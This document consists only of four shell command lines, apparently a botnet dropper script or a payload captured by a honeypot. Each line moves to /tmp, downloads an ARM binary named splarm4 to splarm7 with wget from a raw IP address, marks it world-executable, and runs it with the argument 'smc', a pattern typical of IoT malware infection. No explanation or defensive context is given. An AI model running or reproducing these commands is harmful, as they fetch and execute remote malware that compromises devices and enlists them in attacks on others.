cd /tmp; wget http://45.95.146.126/splarm4; chmod 777 splarm4; ./splarm4 smc
cd /tmp; wget http://45.95.146.126/splarm5; chmod 777 splarm5; ./splarm5 smc
cd /tmp; wget http://45.95.146.126/splarm6; chmod 777 splarm6; ./splarm6 smc
cd /tmp; wget http://45.95.146.126/splarm7; chmod 777 splarm7; ./splarm7 smc
